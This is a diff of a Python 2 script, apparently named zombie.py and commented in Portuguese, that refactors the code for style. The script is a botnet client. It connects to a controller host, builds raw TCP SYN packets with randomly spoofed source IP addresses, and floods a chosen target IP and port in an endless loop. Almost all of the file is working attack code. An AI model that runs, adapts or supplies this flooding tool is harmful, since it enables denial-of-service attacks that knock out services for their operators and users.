@@ -1,45 +1,38 @@
 #coding: utf-8
-from os import fork, getppid, wait
-from sys import exit
+from os import fork
+import sys
 from time import sleep
-import socket, sys
-import os
-import re
-import argparse
-import thread
+import socket
 from struct import *
-from random import randint
-from random import randrange
+from random import randint,randrange
 from multiprocessing import Process
 
 # TODO: Remover prints na tela
-# TODO: Remover imports desnecessários
 
 def get_random_ip():
-    not_valid = [10,127,169,172,192]
+    not_valid = [10, 127, 169, 172, 192]
 
-    first = randrange(1,256)
+    first = randrange(1, 256)
     while first in not_valid:
-        first = randrange(1,256)
+        first = randrange(1, 256)
 
-    ip = ".".join([str(first),str(randrange(1,256)),
-    str(randrange(1,256)),str(randrange(1,256))])
-    return ip
+    return ".".join([str(first), str(randrange(1, 256)),
+                     str(randrange(1, 256)),
+                     str(randrange(1, 256))])
 
 # Funcoes auxiliares para calculo do checksum
-
-def carry_around_add(a, b):
-    c = a + b
-    return (c & 0xffff) + (c >> 16)
+def carry_around_add(a_op, b_op):
+    carry = a_op + b_op
+    return (carry & 0xffff) + (carry >> 16)
 
 def checksum(msg):
-    s = 0
+    csum = 0
     if len(msg) % 2 != 0:
         msg += "\x00"
     for i in range(0, len(msg), 2):
-        w = ord(msg[i]) + (ord(msg[i+1]) << 8)
-        s = carry_around_add(s, w)
-    return ~s & 0xffff
+        j = ord(msg[i]) + (ord(msg[i+1]) << 8)
+        csum = carry_around_add(csum, j)
+    return ~csum & 0xffff
 
 
 # Criacao de um RAW Socket
@@ -47,13 +40,13 @@ def cria_raw_socket():
     try:
         raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
         return raw_socket
-    except socket.error , msg:
+    except socket.error, msg:
         print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
         sys.exit()
 
     # Para calculo do checksum tcp+ip, eh montado um cabecalho especial
     # Obs: ver em http://www.tcpipguide.com/free/t_TCPChecksumCalculationandtheTCPPseudoHeader-2.htm
-def checksum_tcp(source_ip,dest_ip,tcp_header):
+def checksum_tcp(source_ip, dest_ip, tcp_header):
 
     # Campos do Pseudo-Cabecalho
     source_address = socket.inet_aton( source_ip )
@@ -62,14 +55,14 @@ def checksum_tcp(source_ip,dest_ip,tcp_header):
     protocol = socket.IPPROTO_TCP
     tcp_length = len(tcp_header)
 
-    psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
-    psh = psh + tcp_header;
+    psh = pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length)
+    psh = psh + tcp_header
 
     return checksum(psh)
 
-def montaPacote(seqnumber,attack_type,source_ip, dest_ip, source_port, dest_port, window_size, id):
+def monta_pacote(seqnumber, attack_type, source_ip, dest_ip, source_port, dest_port, window_size, id):
     # Construcao do pacote
-    packet = '';
+    packet = ''
 
     # ======== Campos do cabecalho IP ========
 
@@ -102,14 +95,15 @@ def montaPacote(seqnumber,attack_type,source_ip, dest_ip, source_port, dest_port
 
     # IP's de origem e destino.
     # inet_aton converte a notacao numeros-e-pontos em binario (network byte order)
-    saddr = socket.inet_aton ( source_ip )
-    daddr = socket.inet_aton ( dest_ip )
+    saddr = socket.inet_aton(source_ip)
+    daddr = socket.inet_aton(dest_ip)
 
     # Calculo do tamanho do header. Ipv4 = 64 + ihl, Ipv6 = 96 + ihl
     ihl_version = (version << 4) + ihl
 
     # the ! in the pack format string means network order
-    ip_header = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
+    ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off,
+                     ttl, protocol, check, saddr, daddr)
 
     # ======== Campos do cabecalho TCP ========
 
@@ -141,7 +135,7 @@ def montaPacote(seqnumber,attack_type,source_ip, dest_ip, source_port, dest_port
 
     # Tamanho da janela (utilizando tamanho máximo permitido)
     # htons = host to network short
-    window = socket.htons (window_size)
+    window = socket.htons(window_size)
 
     # Checksum (a ser calculado)
     check = 0
@@ -153,13 +147,15 @@ def montaPacote(seqnumber,attack_type,source_ip, dest_ip, source_port, dest_port
     offset_res = (doff << 4) + 0
 
     # the ! in the pack format string means network order
-    tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)
+    tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res,
+                      tcp_flags, window, check, urg_ptr)
 
     # Cálculo do checksum do cabecalho TCP (no caso, do pseudo-cabecalho + header tcp)
-    tcp_checksum = checksum_tcp(source_ip,dest_ip,tcp_header)
+    tcp_checksum = checksum_tcp(source_ip, dest_ip, tcp_header)
 
     # Repete o enpacotamento do cabecalho com o checksum calculado
-    tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)
+    tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res,
+                      tcp_flags, window, tcp_checksum, urg_ptr)
 
     # Pacote final sao os dois headers, pois pacotes SYN nao possuem campo de dados
     packet = ip_header + tcp_header
@@ -175,9 +171,11 @@ def receivemessage(socket):
 
 def attack(raw_socket,attack_type, local_ip, dest_ip, dest_port):
     print "=== " + local_ip + " Attacking " + dest_ip + " on " + dest_port + " ==="
-    while(1):
-        packet = montaPacote(0,attack_type,get_random_ip(), dest_ip,  randint(1800,65533),int(dest_port), 5840, 54321)
-        raw_socket.sendto(packet,(dest_ip,0))
+    while 1:
+        packet = monta_pacote(0, attack_type, get_random_ip(), dest_ip,
+                              randint(1800, 65533), int(dest_port), 5840, 54321)
+
+        raw_socket.sendto(packet, (dest_ip, 0))
         sleep(1)
         print "sending attack"
 
@@ -186,10 +184,10 @@ def attack(raw_socket,attack_type, local_ip, dest_ip, dest_port):
 #comando mais simples: top
 pid = fork()
 if pid == 0:
-    exit()
+    sys.exit()
 else:
     #print "Parent: I created a child and all i want to do is fude..."
-    if(len(sys.argv) < 3) :
+    if len(sys.argv) < 3:
         print 'Usage : python zombie.py hostname port'
         sys.exit()
 
@@ -199,14 +197,14 @@ else:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(None)
     # connect to remote host
-    try :
+    try:
         s.connect((host, port))
     except :
         #print 'Unable to connect'
         sys.exit()
 
     #print 'Connected to remote host'
-    alive = 1;
+    alive = 1
 
     # Obtenção do ip local
     local_ip =  s.getsockname()[0]
@@ -249,9 +247,9 @@ else:
     # Fim do programa
         print "Disconnecting..."
         s.send("die")
-        exit()
+        sys.exit()
     except KeyboardInterrupt:
     # Fim do programa forçado
         print "Disconnecting..."
         s.send("die")
-        exit()
+        sys.exit()
